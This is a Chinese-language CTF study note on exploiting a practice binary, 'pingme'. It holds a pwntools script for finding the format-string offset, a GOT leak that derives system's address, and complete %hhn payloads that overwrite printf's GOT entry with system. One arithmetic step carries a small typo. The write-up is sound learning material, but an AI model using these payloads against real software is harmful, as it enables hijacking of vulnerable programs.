```
gef➤  checksec
[+] checksec for '/home/evan/res/study_note/pwn/example/pingme/code/pingme'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

这里看出可以做溢出和格式化字符串也可以做GOT修改。


用代码尝试看能不能做格式化字符串

```python
from pwn import *


def fmt_index(p):
    expect = b'ABCD44434241\n'
    for i in range (1,32):
        payload = "ABCD%{}$x".format(i)
        p.sendline(payload)
        data = p.recvline()
        if data == expect:
            p.close()
            return i
    p.close()
    return 0

tar = './pingme'
p = process(tar)
p.recvline()
index = fmt_index(p)

if index == 0:
    log.error("fmt_str arg index out of index:%d",3)
log.info("get fmt_str arg index %d\n",index)
```

这边dump失败 直接使用下载的文件


```
readelf -r pingme  | grep printf
08049974  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
```

获取 printf got地址 `08049974`

然后获取printf的内存地址 并推出system的  我这里有libc.so

```
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

payload = p32(printf_got)+b'%7$s'
p.sendline(payload)
printf_addr = u32(p.recvline()[4:8])
system_addr = printf_addr-(libc.symbols['printf']-libc.symbols['system'])

log.info("system address: 0x%x" % system_addr)
```


最后还是构造payload  依旧需要逐字节构造

printf got地址 是 `08049974` 那么个就是 74-77 

那么前面几个字节就是 `\x74\x99\x04\x08\x75\x99\x04\x08\x76\x99\x04\x08\x77\x99\x04\x08`

system地址是 0xf7d58da0 a7-10=144 第二个8d小于a0 所以有个截断 18d-a0=237 同理 1d5-18d = 72 1f7-1d5=34 

所以结果就是 `\x74\x99\x04\x08\x75\x99\x04\x08\x76\x99\x04\x08\x77\x99\x04\x08%144c%7$hhn%237c%8$hhn%72c%9$hhn%34c%10$hhn`

我这边实际地址是 `0xf7e09060`

所以结果就是 `\x74\x99\x04\x08\x75\x99\x04\x08\x76\x99\x04\x08\x77\x99\x04\x08%80c%7$hhn%48c%8$hhn%80c%9$hhn%23c%10$hhn`


(/proc/sys/kernel/randomize_va_space 设置为0)